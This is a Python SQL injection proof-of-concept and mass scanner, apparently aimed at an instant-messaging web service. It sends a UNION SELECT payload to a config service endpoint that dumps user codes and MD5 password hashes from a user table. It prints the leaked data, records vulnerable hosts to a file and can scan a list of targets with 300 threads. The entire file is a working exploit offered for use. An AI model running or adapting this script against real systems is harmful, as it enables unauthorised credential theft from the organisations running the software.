import requests,re,argparse,time,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings() # 解除警告
proxies = { 
       "http": "http://127.0.0.1:8080", 
       "https": "http://127.0.0.1:8080" 
       }
def banner():
	banner = """
 █╗      █████╗  ██████╗ ███╗   ███╗
██║     ██╔══██╗██╔═══██╗████╗ ████║
██║     ███████║██║   ██║██╔████╔██║
██║     ██╔══██║██║   ██║██║╚██╔╝██║
███████╗██║  ██║╚██████╔╝██║ ╚═╝ ██║
╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝
                        version:1.0 
	"""
	print(banner)
def poc(target):
	payload_url = "/Webservice/IM/Config/ConfigService.asmx/GetIMDictionary"
	url = target + payload_url
	headers={
		"upgrade-insecure-requests":"1",
        "user-agent":"mozilla/5.0 (macintosH; intEl mAC Os x 10_15_7) apPleWebkit/537.36 (KHtml, liKe geckO) chrome/115.0.0.0 safari/537.36",
        "accept":"text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "accept-encoding":"gzip, deflate",
        "accept-language":"ZH-cn,zh;q=0.9",
        "connection":"close",
        "content-type":"application/x-www-form-urlencoded",
        "content-length":"88",
	}
	data="dasdas=&key=1' UNION ALL SELECT top 1812 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER --"
	
	try:
		res = requests.post(url=url,headers=headers,data=data,verify=False)
		res1 = requests.get(url=target,verify=False)
		if res1.status_code == 200:
			if res.status_code == 200:
				if "9AAC" in res.text:
					print(res.text)
					print(f"[+]该url存在SQL漏洞：{target}")
					with open("result.txt","a",encoding="utf-8") as f:
						f.write(target+"\n")
				else:
					print(f"[-]该url不存在SQL漏洞：{target}")
			else:
				print(f"该url连接失败：{target}")
		else:
			print(f"该url连接失败：{target}")
	
	except:
		print(f"[*]该url出现错误：{target}")


def main():
	banner()
	parser = argparse.ArgumentParser()
	parser.add_argument("-u","--url",dest="url",type=str,help="please write link")
	parser.add_argument("-f","--file",dest="file",type=str,help="please write file\'path")
	args = parser.parse_args()
	if args.url and not args.file:
		poc(args.url)
	elif args.file and not args.url:
		url_list = []
		with open(args.file,"r",encoding="utf-8") as f:
			for i in f.readlines():
				url_list.append(i.strip().replace("\n",""))
		mp = Pool(300)
		mp.map(poc,url_list)
		mp.close()
		mp.join()
	else:
		print(f"\n\tUage:python {sys.argv[0]} -h")


if __name__ == "__main__":
	main()